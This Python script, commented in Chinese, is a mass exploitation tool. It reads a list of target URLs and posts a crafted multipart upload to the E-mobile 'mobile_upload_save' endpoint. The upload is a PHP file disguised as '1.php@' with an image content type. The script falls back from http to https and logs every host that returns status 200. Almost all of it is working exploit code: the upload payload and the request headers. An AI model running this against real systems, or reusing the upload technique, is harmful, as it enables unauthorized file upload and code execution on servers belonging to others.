import requests
from tqdm import tqdm

# 读取 URL 文档
url_file = input('请输入要检查的 URL 文档: ')
with open(url_file, 'r') as f:
    urls = f.read().splitlines()

# 输入输出文件名
output_file = input('请输入要输出的文件名: ')

# 检查 URL 并将结果写入输出文件
with open(output_file, 'w') as f:
    for url in tqdm(urls):
        # 先尝试使用 http 协议发送 POST 请求
        headers = {
            'Host': url,
            'Content-Length': '338',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Origin': 'null',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
            'Connection': 'close'
        }
        data = '------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\nContent-Disposition: form-data; name="upload_quwan"; filename="1.php@"\nContent-Type: image/jpeg\n\n<?php phpinfo();?>\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\nContent-Disposition: form-data; name="file"; filename=""\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--'
        try:
            response = requests.post('http://' + url + '/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save', headers=headers, data=data, timeout=5)
        except requests.exceptions.RequestException:
            # 如果无法建立连接，则尝试使用 https 协议发送 POST 请求
            try:
                response = requests.post('https://' + url + '/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save', headers=headers, data=data, timeout=5, verify=True)
            except requests.exceptions.RequestException:
                continue
        
        # 检查响应状态码是否为 200
        if response.status_code == 200:
            f.write(url + ' 返回 200\n')
        else:
            continue